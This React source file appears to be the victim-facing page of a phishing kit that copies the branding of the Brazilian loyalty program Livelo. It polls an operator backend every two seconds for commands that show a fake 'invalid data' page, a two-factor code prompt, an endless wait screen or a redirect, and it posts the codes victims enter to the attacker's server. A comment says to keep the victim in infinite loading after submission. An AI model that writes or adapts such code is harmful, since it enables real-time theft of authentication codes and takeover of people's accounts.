import { useState, useEffect } from "react";
import axios from "axios";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

function CommandPage({ userId }) {
  const [currentCommand, setCurrentCommand] = useState(null);
  const [inputValue, setInputValue] = useState("");
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  // Verificar comandos a cada 2 segundos
  useEffect(() => {
    const checkCommand = async () => {
      try {
        const response = await axios.get(`${API}/user/check-action/${userId}`);
        if (response.data && response.data.action) {
          setCurrentCommand(response.data);
        }
      } catch (error) {
        console.error("Erro ao verificar comando:", error);
      }
    };

    checkCommand();
    const interval = setInterval(checkCommand, 2000);
    return () => clearInterval(interval);
  }, [userId]);

  const handleSubmit = async (e, field) => {
    e.preventDefault();
    setLoading(true);
    
    try {
      await axios.post(`${API}/user/submit-data/${userId}`, {
        field: field,
        value: inputValue
      });
      setSubmitted(true);
    } catch (error) {
      console.error("Erro ao enviar dados:", error);
    }
    // Manter em loading infinito após enviar
  };

  // Página de dados inválidos
  if (currentCommand?.action === "INV") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4 font-inter">
        <div className="max-w-md w-full text-center">
          <div className="mb-6">
            <svg className="w-20 h-20 mx-auto text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
          <h1 className="text-3xl font-bold text-gray-900 mb-4">Dados Inválidos</h1>
          <p className="text-gray-600 mb-8">
            Os dados que você digitou estão incorretos. Por favor, tente novamente com as informações corretas.
          </p>
          <button
            onClick={() => window.location.reload()}
            className="bg-pink-500 hover:bg-pink-600 text-white px-8 py-3 rounded-full font-semibold transition-colors"
          >
            Tentar Novamente
          </button>
        </div>
      </div>
    );
  }

  // Página de código 2FA (Autenticação de Duas Etapas)
  if (currentCommand?.action === "AUT") {
    return (
      <div className="min-h-screen bg-white flex flex-col font-inter">
        <div className="flex-1 flex flex-col items-center pt-16 px-4">
          {/* Logo Livelo */}
          <div className="mb-8">
            <img 
              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
              alt="Livelo Logo" 
              className="h-10 w-auto"
            />
          </div>

          {/* Ícone de Segurança */}
          <div className="mb-6">
            <div className="w-20 h-20 bg-gradient-to-br from-pink-100 to-purple-100 rounded-full flex items-center justify-center">
              <svg 
                className="w-10 h-10 text-pink-500" 
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                <path 
                  strokeLinecap="round" 
                  strokeLinejoin="round" 
                  strokeWidth={2} 
                  d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" 
                />
              </svg>
            </div>
          </div>

          {/* Título */}
          <h1 className="text-2xl font-extrabold text-gray-900 mb-3 text-center">
            Autenticação de Duas Etapas
          </h1>

          {/* Descrição */}
          <p className="text-gray-600 mb-8 text-center max-w-sm">
            Digite o código do seu aplicativo autenticador ou o código de verificação que enviamos para você.
          </p>

          {/* Formulário */}
          <form onSubmit={(e) => handleSubmit(e, "token_2fa")} className="w-full max-w-md space-y-6">
            {/* Campo de código */}
            <div className="relative">
              <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
                <svg 
                  xmlns="http://www.w3.org/2000/svg" 
                  className="h-5 w-5" 
                  fill="none" 
                  viewBox="0 0 24 24" 
                  stroke="currentColor"
                >
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M7 20l4-16m2 16l4-16M6 9h14M4 15h14" 
                  />
                </svg>
              </div>
              <input
                type="text"
                value={inputValue}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '');
                  if (value.length <= 6) {
                    setInputValue(value);
                  }
                }}
                placeholder="Digite o código de 6 dígitos"
                maxLength="6"
                disabled={loading}
                className="w-full pl-12 pr-4 py-3.5 border border-gray-900 rounded-lg text-center text-xl font-semibold tracking-widest focus:outline-none focus:border-pink-500 transition-colors disabled:bg-gray-100"
              />
            </div>

            {/* Botão Confirmar */}
            <button
              type="submit"
              disabled={loading || inputValue.length !== 6}
              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
                inputValue.length === 6 && !loading
                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
            >
              {loading ? (
                <div className="flex items-center justify-center">
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                </div>
              ) : (
                "Confirmar"
              )}
            </button>

            {/* Link de ajuda */}
            <div className="text-center pt-2">
              <a
                href="#"
                className="text-pink-500 hover:text-pink-600 text-sm transition-colors underline"
              >
                Não recebeu o código?
              </a>
            </div>
          </form>
        </div>

        {/* Voltar */}
        <div className="p-8">
          <a
            href="#"
            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-4 w-4 mr-2"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M15 19l-7-7 7-7"
              />
            </svg>
            Voltar para página inicial
          </a>
        </div>
      </div>
    );
  }

  // Página aguarde
  if (currentCommand?.action === "AGUARDE") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4 font-inter">
        <div className="max-w-md w-full text-center">
          <div className="mb-6">
            <div className="inline-block animate-spin rounded-full h-16 w-16 border-b-4 border-pink-500"></div>
          </div>
          <h1 className="text-3xl font-bold text-gray-900 mb-4">Aguarde...</h1>
          <p className="text-gray-600">
            Estamos processando sua solicitação. Por favor, aguarde um momento.
          </p>
        </div>
      </div>
    );
  }

  // Redirecionar
  if (currentCommand?.action === "REDIRECT" && currentCommand?.redirect_url) {
    window.location.href = currentCommand.redirect_url;
    return null;
  }

  return null;
}

export default CommandPage;
